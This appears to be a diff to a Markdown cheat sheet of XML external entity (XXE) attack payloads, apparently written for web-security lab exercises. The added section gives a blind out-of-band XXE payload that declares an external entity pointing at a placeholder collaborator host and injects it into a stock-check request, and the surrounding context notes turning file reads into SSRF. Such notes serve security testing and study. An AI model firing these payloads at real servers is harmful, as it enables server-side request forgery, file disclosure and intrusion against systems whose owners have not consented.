@@ -19,6 +19,16 @@ Just use http protocol instead of file protocol to have SSRF.
   <storeId>1</storeId>
 </stockCheck>
 ```
+## 3. Blind XXE with Out of Band Interaction
+Check for DNS and HTTP interaction with the Burp Collaborator if you are not getting any output in response.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://BURP_COLLOBORATOR">]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
 ### Inband XXE with parameter entity
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
